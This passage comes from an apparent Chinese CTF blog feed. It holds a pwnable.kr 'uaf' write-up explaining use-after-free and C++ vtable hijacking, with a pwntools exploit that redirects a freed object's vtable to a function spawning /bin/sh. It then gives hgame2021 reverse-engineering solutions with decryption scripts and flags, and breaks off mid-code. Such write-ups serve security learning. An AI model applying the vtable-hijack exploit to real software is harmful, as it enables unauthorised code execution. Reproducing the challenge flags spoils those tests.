uaf的原理其实并不难懂，首先需要一个迷途指针，也称为野指针，这个指针时因为在使用玩分配的堆空间后没有将指向堆的指针制空造成的，利用野指针我们可以向这块堆中写入一些东西，然后在申请堆空间，在释放完后马上又申请会申请到那段刚刚释放的堆空间。</p><p>这个是最简单的uaf程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p0;</span><br><span class="line">    p0=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>);   <span class="comment">//指针p0申请内存；</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p0,<span class="string">&quot;hello&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p0 Addr:%x,%s\n&quot;</span>,p0,p0);      <span class="comment">//打印其地址与值；</span></span><br><span class="line">    <span class="built_in">free</span>(p0);                             <span class="comment">//释放p0；</span></span><br><span class="line">    <span class="keyword">char</span> *p1;</span><br><span class="line">    p1==(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(p1,<span class="string">&quot;word&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1 Addr:%x,%s\n&quot;</span>,p1,p0);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="C-的一些知识点"><a href="#C-的一些知识点" class="headerlink" title="C++的一些知识点"></a>C++的一些知识点</h3><h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a><a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E5%9E%8B_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6)">多态</a></h4><p>​        这个概念在在wiki上解释得非常抽象，但是上面的源码其实挺适合我们理解的，Man和Woman都继承了Person这个类，introduce这个动作是所有人都有的，但是细分到Man和Woman时他们之间的introduce又不一样了，这就是多态。</p><p>​        我的理解为，在于参考系的不同，这样就存在宏观与微观的区别。。怪异的理解。</p><h4 id="虚表"><a href="#虚表" class="headerlink" title="虚表"></a>虚表</h4><p>​        c++面向对象编程的多态性需要由虚表来实现。</p><p>​        虚表通俗来讲就是一个函数指针数组，这个数组里面的指针指向了类中的虚函数，<strong>但是虚函数表并不存放在类中</strong>，类中只有一个指针指向虚函数表。而在c++中同一个类的对象共用一张虚表。        </p><h4 id="类在内存中的结构"><a href="#类在内存中的结构" class="headerlink" title="类在内存中的结构"></a>类在内存中的结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+------------------------+           virtual talbe                                           </span><br><span class="line">+  virtual table pointer +  ----&gt;  +---------------+ </span><br><span class="line">+------------------------+         + func1 pointer +    </span><br><span class="line">+   characteristic _ 1   +         + --------------+</span><br><span class="line">+------------------------+         + func2 pointer +</span><br><span class="line">+   characteristic _ 2   +         +---------------+</span><br><span class="line">+------------------------+         + func3 pointer +</span><br><span class="line">+   characteristic _ 3   +         +---------------+</span><br><span class="line">+------------------------+</span><br><span class="line">+       ...........      +</span><br><span class="line">+------------------------+</span><br><span class="line">+   characteristic _ n   +</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure><h3 id="程序分析分析"><a href="#程序分析分析" class="headerlink" title="程序分析分析"></a>程序分析分析</h3><ul><li><p>程序开始申请了两块内存</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Human* m = <span class="keyword">new</span> Man(<span class="string">&quot;Jack&quot;</span>, <span class="number">25</span>);</span><br><span class="line">Human* w = <span class="keyword">new</span> Woman(<span class="string">&quot;Jill&quot;</span>, <span class="number">21</span>);</span><br></pre></td></tr></table></figure></li><li><p>用户选择菜单（1.调用方法。2.申请内存，读入参数。3.释放内存）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(op)&#123;</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                               m-&gt;introduce();</span><br><span class="line">                               w-&gt;introduce();</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                               len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">                               data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">                               read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                               <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;your data is allocated&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                               <span class="keyword">delete</span> m;</span><br><span class="line">                               <span class="keyword">delete</span> w;</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现程序没有对释放内存后的指针置空，存在野指针，而选择而又可以申请内存，满足UAF漏洞的触发条件。初步的想法就是先3在2（先释放后申请），在向申请的空间中写入东西，现在的问题是写什么进去。释放的空间是类，写入的数据改变的是类，如果类有虚函数，那么类结构的开头就是虚表指针。我们改变的就是虚表指针，改变虚表指针的作用可以通过IDA查看反编译代码来学习</p></li></ul><h4 id="IDA反编译来理解虚函数表"><a href="#IDA反编译来理解虚函数表" class="headerlink" title="IDA反编译来理解虚函数表"></a>IDA反编译来理解虚函数表</h4><p>跟踪变量v12和v13</p><p><img src="pwnable..kr-uaf.assets/image-20210205174523338.png"></p><p>下面这里有点难看懂，如指针没有学好看这种一定会看晕。我尽量写清楚一点</p><p>首先要明白v12,v13这两个变量存放的是对象虚表的地址，因为两个变量类型和操作方法一样，我只说v12就可以了</p><ol><li>将v12强转成QWORD*类型，在取这个地址中的值，QWORD占8个字节，一次取8位，取出的这8位就是虚表的首地址</li><li>虚表首地址加+8，代表取虚表中的第二个函数指针</li><li>将函数指针赋值，在调用，参数就是对象本身（this指针)，如果不懂this指针去Google了解下，很重要。</li></ol><p><img src="pwnable..kr-uaf.assets/image-20210205174708424.png"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>​        通过上面的分析，知道了调用虚函数其实是通过偏移来实现的，通过+8可以调用第二个虚函数，如果我们得到了虚函数表基址，并且改变，就可以控制函数调用我们想调用的虚函数，而程序为我们准备了这样一个虚函数，我们可以使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过IDA查找到Person函数的虚表地址是0x0000000000401590，将这个值-8，那么在调用的时候就刚好可以调用到give_shell这个函数</p><p><img src="pwnable..kr-uaf.assets/image-20210205180240856.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本机exp，远程失败好像是我没有写文件的权限？</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">vtable_addr = <span class="number">0x0000000000401550</span></span><br><span class="line">filepath = <span class="string">&#x27;/home/fish/uaf/bash&#x27;</span></span><br><span class="line"><span class="comment">#filepath = &#x27;/tmp/f1sh&#x27;</span></span><br><span class="line">write_stream = p64(vtable_addr - <span class="number">8</span>)</span><br><span class="line"><span class="keyword">with</span> open(filepath, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(write_stream)</span><br><span class="line"></span><br><span class="line">Argv = [<span class="string">&#x27;/home/uaf/uaf&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, filepath]</span><br><span class="line">p = process(executable = <span class="string">&#x27;./uaf&#x27;</span>, argv = Argv )</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这个是链接上服务器后手动getshell得到的结果</p><p><img src="pwnable..kr-uaf.assets/image-20210205224956747.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;&lt;img src=&quot;pwnable..kr-uaf.assets/image-20210208131805440.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>hgame2021-re部分题解</title>
    <link href="http://example.com/2021/02/02/CTF/wp/HGAME/"/>
    <id>http://example.com/2021/02/02/CTF/wp/HGAME/</id>
    <published>2021-02-01T16:55:40.696Z</published>
    <updated>2021-05-07T11:24:25.555Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hgame 2021的逆向部分题解，一道nc题和一道安卓逆向没有做，每周的题目都看了看，做了四分之三左右，杭电的比赛题目出得很有水平，自己学到了很多东西，wp本来说每周都写的，但是懒，比赛都结束一个月了才偷工减料得写出来。有兴趣的师傅凑合着看看吧吧🤪</p><h2 id="RE-week1"><a href="#RE-week1" class="headerlink" title="RE-week1"></a>RE-week1</h2><h3 id="一杯阿帕茶"><a href="#一杯阿帕茶" class="headerlink" title="一杯阿帕茶"></a>一杯阿帕茶</h3><p>明显的TEA加密标志，后面分析为XXTEA加密</p><p><img src="HGAME.assets/image-20210201201051733.png"></p><p>加密后的数据，刚好35位</p><p><img src="HGAME.assets/image-20210201201231341.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5 ^ y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3 ^ z&lt;&lt;4)) ^ ((sum ^ y) + (k[(p&amp;3) ^ e] ^ z)))</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">XXTEA</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> sum, y, z;</span><br><span class="line"><span class="keyword">uint32_t</span> p, rounds, e;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">sum += DELTA;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++) &#123;</span><br><span class="line">y = v[p + <span class="number">1</span>];</span><br><span class="line">z = v[p] += MX;</span><br><span class="line">&#125;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line">z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">&#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;</span><br><span class="line">n = -n;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">sum = rounds * DELTA;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--) &#123;</span><br><span class="line">z = v[p - <span class="number">1</span>];</span><br><span class="line">y = v[p] -= MX;</span><br><span class="line">&#125;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line">y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">sum -= DELTA;</span><br><span class="line">&#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> arr[] = &#123;<span class="number">3880694563</span>, <span class="number">3081185334</span>, <span class="number">1506439138</span>, <span class="number">2524759489</span>, <span class="number">3883935348</span>, <span class="number">1026381030</span>, <span class="number">2325545814</span>, <span class="number">2581382044</span>, <span class="number">1881594093</span>, <span class="number">1781792173</span>, <span class="number">4103492874</span>, <span class="number">1553756062</span>, <span class="number">468045900</span>, <span class="number">1730391575</span>, <span class="number">1383114178</span>, <span class="number">2890011402</span>, <span class="number">2227070898</span>, <span class="number">1885128569</span>, <span class="number">1548828056</span>, <span class="number">4214676013</span>, <span class="number">571971141</span>, <span class="number">1558401693</span>, <span class="number">3515474427</span>, <span class="number">3898332297</span>, <span class="number">1942540575</span>, <span class="number">1421197718</span>, <span class="number">3061626000</span>, <span class="number">555214026</span>, <span class="number">2648963476</span>, <span class="number">794468778</span>, <span class="number">2816999933</span>, <span class="number">3272437419</span>, <span class="number">464379036</span>, <span class="number">877899850</span>, <span class="number">2460223225</span>&#125;;</span><br><span class="line"><span class="keyword">uint32_t</span> key[] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> &#125;;</span><br><span class="line">XXTEA(<span class="number">-35</span>, arr, key);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="HGAME.assets/image-20210201201420062.png"></p><h3 id="Welcome-to-reverse-world"><a href="#Welcome-to-reverse-world" class="headerlink" title="Welcome to reverse world !"></a>Welcome to reverse world !</h3><p>简单题，一个异或直接搞定</p><p><img src="HGAME.assets/image-20210201201736107.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re</span>():</span></span><br><span class="line">    addr = <span class="number">0x00007FF7F7513480</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">22</span>):</span><br><span class="line">        flag += chr((<span class="number">0xff</span> - i) ^ get_byte(addr +i))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p><img src="HGAME.assets/image-20210201201838100.png"></p><h3 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h3><p>给了我们python字节码，需要我们自己还原成python代码，下面贴还原过后的代码，加密过程很简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_func</span>():</span></span><br><span class="line">    raw_flag = input(<span class="string">&#x27;give me your flag:\n&#x27;</span>)</span><br><span class="line">    cipher = list(raw_flag[<span class="number">6</span>:<span class="number">-1</span>])</span><br><span class="line">    length = len(cipher)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length // <span class="number">2</span>):</span><br><span class="line">        cipher[<span class="number">2</span>*i], cipher[<span class="number">2</span>*i+<span class="number">1</span>] = cipher[<span class="number">2</span>*i+<span class="number">1</span>] , cipher[<span class="number">2</span>*i]</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        res.append(ord(cipher[i]) ^ i)</span><br><span class="line">    res = bytes(res).hex()</span><br><span class="line">    print(<span class="string">&#x27;your flag: &#x27;</span> + res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(dis.dis(input_func))</span></span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Cip</span>():</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    res = []</span><br><span class="line">    cipher = <span class="string">&#x27;30466633346f59213b4139794520572b45514d61583151576638643a&#x27;</span></span><br><span class="line">    length = len(cipher)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, length, <span class="number">2</span>):</span><br><span class="line">        res.append(int(cipher[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">        flag += chr(res[i] ^ i)</span><br><span class="line">    flag = list(flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag) // <span class="number">2</span>):</span><br><span class="line">        flag[i*<span class="number">2</span>+<span class="number">1</span>], flag[i*<span class="number">2</span>] = flag[i*<span class="number">2</span>],flag[i*<span class="number">2</span> + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">        print(flag[i],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~&#125;</span></span><br></pre></td></tr></table></figure><h2 id="RE-week2"><a href="#RE-week2" class="headerlink" title="RE-week2"></a>RE-week2</h2><h3 id="helloRe2"><a href="#helloRe2" class="headerlink" title="helloRe2"></a>helloRe2</h3><p>有两处检测，第一处直接明文比较，但是注意要倒序</p><p><img src="HGAME.assets/image-20210326200613164.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password1: 2b0c5e6a3a20b189</span><br></pre></td></tr></table></figure><p>第二处开启了另一个线程，利用了第一次检测的输入值异或一次后作为秘钥，进行CBC模式的AES加密，初始向量为0-15</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;2b0c5e6a3a20b189&#x27;</span></span><br><span class="line">key = bytes(ord(key[i])^i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>))</span><br><span class="line">Cipher = bytes([<span class="number">183</span>, <span class="number">254</span>, <span class="number">254</span>, <span class="number">217</span>, <span class="number">7</span>, <span class="number">118</span>, <span class="number">121</span>, <span class="number">101</span>, <span class="number">63</span>, <span class="number">78</span>, <span class="number">95</span>, <span class="number">98</span>, <span class="number">213</span>, <span class="number">2</span>, <span class="number">246</span>, <span class="number">126</span>])</span><br><span class="line">iv = bytes(i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">Plain = aes.decrypt(Cipher)</span><br><span class="line">print(Plain)</span><br><span class="line"><span class="comment">#  7a4ad6c5671fb313</span></span><br></pre></td></tr></table></figure><p><img src="HGAME.assets/image-20210326202758851.png"></p><h3 id="app-release"><a href="#app-release" class="headerlink" title="app-release"></a>app-release</h3><p>不熟悉安卓，但是经过一系列网上找资料后查到了如何逆向APK代码，过程很简单，就是将KEY进行sha256计算成16位的key，进行AES加密后在进行base64编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">string = <span class="string">b&#x27;A_HIDDEN_KEY&#x27;</span></span><br><span class="line">flag = <span class="string">b&#x27;EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY&#x27;</span></span><br><span class="line"></span><br><span class="line">key = hashlib.sha256(string).digest()</span><br><span class="line">iv = hashlib.md5(string).digest()</span><br><span class="line">Cipher = base64.b64decode(flag)</span><br><span class="line"></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">Plain = aes.decrypt(Cipher)</span><br><span class="line">print(Plain)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;jUst_A_3z4pp_write_in_k07l1n&#125;</span></span><br></pre></td></tr></table></figure><h2 id="RE-week3"><a href="#RE-week3" class="headerlink" title="RE-week3"></a>RE-week3</h2><p>第三周只做出来一道题</p><h3 id="FAKE"><a href="#FAKE" class="headerlink" title="FAKE"></a>FAKE</h3><p>简单的smc，函数sub_40699B进行了代码解密工作，首先用idaPython将加密后的代码解码便于静态分析</p><p><img src="HGAME.assets/image-20210326211521963.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">addr1 = <span class="number">0x0000000000401216</span></span><br><span class="line">addr2 = <span class="number">0x0000000000409080</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1086</span>):</span><br><span class="line">    x = get_byte(addr1+i)</span><br><span class="line">    y = get_byte(addr2+i)</span><br><span class="line">    patch_byte(addr1+i,x^y)</span><br></pre></td></tr></table></figure><p>解密后的关键代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 